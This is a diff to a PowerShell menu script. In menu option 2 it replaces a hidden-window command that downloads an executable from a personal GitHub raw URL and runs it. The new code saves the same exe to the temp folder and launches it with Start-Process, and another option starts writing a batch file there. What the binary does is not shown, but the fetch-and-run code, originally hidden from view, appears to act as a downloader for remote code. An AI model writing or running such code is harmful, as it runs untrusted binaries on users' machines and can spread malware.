@@ -84,9 +84,16 @@ function Show-Menu {
                 }
 
                 '2' {
-                    curl "https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe" -o rnp.exe && start "" /b powershell -WindowStyle Hidden -Command "Start-Process 'rnp.exe'" & exit
-                    Pause-Menu
-                }
+    $file = "$env:TEMP\rnp.exe"
+
+    curl.exe -L "https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe" -o $file
+
+    if (Test-Path $file) {
+        Start-Process $file
+    }
+
+    Pause-Menu
+}
 
                 '3' {
     $batFile = "$env:TEMP\de.bat"
